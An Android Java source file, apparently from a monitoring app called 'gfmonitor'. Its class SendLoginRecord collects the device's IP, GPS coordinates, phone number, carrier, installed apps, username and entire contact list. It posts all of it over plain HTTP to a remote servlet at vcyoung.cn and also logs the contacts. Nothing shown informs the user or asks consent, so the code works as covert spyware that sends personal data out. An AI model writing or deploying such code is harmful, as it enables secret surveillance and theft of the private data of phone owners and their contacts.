package cn.wxjia.gfmonitor.service;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.app.Activity;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

public class SendLoginRecord {
	private static final String TAG = "WXJIA_MONITOR";

	public boolean sendLoginRecord(Activity activity) {
		ContactToWebService contactToWebService = new ContactToWebService();
		DeviceInformationService deviceInformationService = new DeviceInformationService(
				activity);

		String path = "http://www.vcyoung.cn/tecentWeb/LoginRecordServlet";
		Map<String, String> params = new HashMap<String, String>();

		String ip = deviceInformationService.getIp();
		double[] coordinateDoubles = deviceInformationService.getCoordinate();
		String address = coordinateDoubles[0] + " , " + coordinateDoubles[1];

		String teleNumber = deviceInformationService.getTeleNumber();
		String providersName = deviceInformationService.getProvidersName();
		int[] screenInts = deviceInformationService.getScreen();
		String screen = screenInts[0] + " x " + screenInts[1];
		String apps = deviceInformationService.getApps();

		Intent intent = activity.getIntent();
		String username = intent.getStringExtra("username");
		params.put("username", username);

		params.put("ip", ip);
		params.put("address", address);
		params.put("teleNumber", teleNumber);
		params.put("providersName", providersName);
		params.put("screen", screen);
		params.put("apps", apps);

		// 获取通讯录
		ContactService contactService = new ContactService();
		List<String> contacts = contactService.getContacts(activity);

		StringBuilder sb = new StringBuilder();
		for (String contact : contacts) {
			sb.append(contact);
			sb.append("\r\n");
		}
		Log.i(TAG, "通讯录内容 = " + sb);
		params.put("contacts", sb.toString());

		try {
			contactToWebService.fetchRequest(path, params, "UTF-8");
		} catch (UnsupportedEncodingException e) {
			Log.i(TAG, "UnsupportedEncodingException = " + e.getMessage());
			Toast.makeText(activity, "UnsupportedEncodingException",
					Toast.LENGTH_LONG).show();
		} catch (MalformedURLException e) {
			Log.i(TAG, "MalformedURLException = " + e.getMessage());
			Toast.makeText(activity, "MalformedURLException", Toast.LENGTH_LONG)
					.show();
		} catch (ProtocolException e) {
			Log.i(TAG, "ProtocolException = " + e.getMessage());
			Toast.makeText(activity, "ProtocolException", Toast.LENGTH_LONG)
					.show();
		} catch (IOException e) {
			Log.i(TAG, "IOException = " + e.getMessage());
			Toast.makeText(activity, "IOException", Toast.LENGTH_LONG).show();
		} catch (Exception e) {
			Log.i(TAG, "Exception = " + e.getMessage());
			Toast.makeText(activity, "Exception", Toast.LENGTH_LONG).show();
		}
		return true;
	}
}
